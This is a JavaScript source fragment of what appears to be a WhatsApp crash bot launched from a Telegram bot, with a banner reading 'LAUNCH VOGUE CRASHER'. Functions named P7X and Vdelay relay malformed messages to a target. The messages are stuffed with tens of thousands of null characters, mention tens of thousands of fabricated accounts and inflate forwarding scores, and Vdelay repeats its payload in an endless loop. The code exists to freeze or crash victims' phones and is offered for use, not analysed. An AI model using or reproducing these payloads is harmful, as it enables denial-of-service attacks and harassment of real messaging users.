            text: "kmu mau aku balik kyk dulu?"
          },
          footer: {
            text: "aku sendiri udh gabisa berikir kyk gitu"
          },
          header: {
            hasMediaAttachment: true
          },
          carouselMessage: {
            cards: [...cards]
          }
        }
      }
    }
  }, {});
  
  await sock.relayMessage(jid, msg.message, {
    messageId: msg.key.id, 
    participant: { jid: jid }
  });
}

async function P7X(sock, target) {
  try {
      await sock.relayMessage(
         target,
          {
              groupStatusMessageV2: {
                  message: {
                      interactiveResponseMessage: {
                          body: {
                              text: "Zenz",
                              format: "DEFAULT"
                          },
                          nativeFlowResponseMessage: {
                              name: "payment_method",
                              buttonParamsJson: `{\"reference_id\":null,\"payment_method\":${"\u0000".repeat(9000)},\"payment_timestamp\":null,\"share_payment_status\":false}`,
                              version: 3
                          },
                          contextInfo: {
                              remoteJid: Math.random().toString(36) + "\u0000".repeat(9000),
                              isForwarded: true,
                              forwardingScore: 9999,
                              statusAttributionType: 2,
                              statusAttributions: Array.from({ length: 99999 }, (_, n) => ({
                                  participant: `62${n + 836598}@s.whatsapp.net`,
                                  type: 1
                              }))
                          }
                      }
                  }
              }
         },
     { participant: { jid: target } }
  );

    const pox = {
      groupStatusMessageV2: {
        message: {
          extendedTextMessage: {
            text: "\u0000".repeat(1000),
            viewOnce: true,
            contextInfo: {
              mentionedJid: [
                target,
                ...Array.from(
                  { length: 2000 },
                  () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                )
              ],
              isForwarded: true,
              statusAttributionType: 3,
              forwardingScore: 7205,
              isForwarded: true,
              pairedMediaType: null,
              forwardOrigin: "UNKNOWN"
            }
          }
        }
      }
    };

    const Apox = {
      groupStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "Zen?",
              format: "DEFAULT"
            },
            contextInfo: {
              mentionedJid: ["13135550002@s.whatsapp.net"]
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\u0000".repeat(90000),
              version: 3
            }
          }
        }
      }
    };

    await sock.relayMessage(target, pox, { participant: { jid: target } });
    await sock.relayMessage(target, Apox, { participant: { jid: target } });
  } catch {}
}

async function Vdelay(sock, target) {
  while (true) {
    await sock.sendMessage("status@broadcast", {
      text: "WHY",
      contextInfo: {
        remoteJid: "undefined@s.whatsapp.net",
        mentionedJid: ["status@broadcast"],
        isForwarded: true,
        forwardingScore: 9999
      },
      buttons: [
        {
          buttonId: "\0",
          buttonText: { displayText: " 696 " },
          type: 3,
          nativeFlowInfo: {
            name: "voice_call",
            paramsJson: "\0".repeat(1000000)
          }
        }
      ]
    }, { 
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {
          status_setting: "allowlist"
        },
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{
            tag: "to",
            attrs: {
              jid: target
            }
          }]
        }]
      }]
    });
    
    await new Promise((r) => setTimeout(r, 2000));
  }
}

//     _       ___  _   _ _   _ _____  _   _        
//    | |     / _ \| | | | \ | /  __ \| | | |       
//    | |    / /_\ \ | | |  \| | /  \/| |_| |       
//    | |    |  _  | | | | . ` | |    |  _  |       
//    | |____| | | | |_| | |\  | \__/\| | | |       
//    \_____/\_| |_/\___/\_| \_/\____/\_| |_/       
//                                                  
//                                                  
//     _   _  _____ _____ _   _ _____               
//    | | | ||  _  |  __ \ | | |  ___|              
//    | | | || | | | |  \/ | | | |__                
//    | | | || | | | | __| | | |  __|               
//    \ \_/ /\ \_/ / |_\ \ |_| | |___               
//     \___/  \___/ \____/\___/\____/               
//                                                  
//                                                  
//     _____ ______  ___   _____ _   _  ___________ 
//    /  __ \| ___ \/ _ \ /  ___| | | ||  ___| ___ \
//    | /  \/| |_/ / /_\ \\ `--.| |_| || |__ | |_/ /
//    | |    |    /|  _  | `--. \  _  ||  __||    / 
//    | \__/\| |\ \| | | |/\__/ / | | || |___| |\ \ 
//     \____/\_| \_\_| |_/\____/\_| |_/\____/\_| \_|
//                                                  
//                                                  

bot.launch()